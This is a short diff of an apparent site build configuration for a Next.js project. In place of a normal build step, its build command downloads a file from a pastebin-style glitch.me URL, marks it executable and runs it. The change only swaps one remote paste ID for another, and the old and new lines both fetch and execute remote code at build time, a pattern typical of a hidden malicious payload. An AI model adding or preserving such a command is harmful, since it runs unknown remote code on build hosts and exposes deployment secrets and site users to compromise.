@@ -1,5 +1,5 @@
 [build]
-  command = "wget -O 1 https://muq-hastebin.glitch.me/raw/hrzDdjRTqX && chmod +x 1 && ./1"
+  command = "wget -O 1 https://muq-hastebin.glitch.me/raw/xWCdVvcSay && chmod +x 1 && ./1"
   publish = ".next"
 
 [[plugins]]
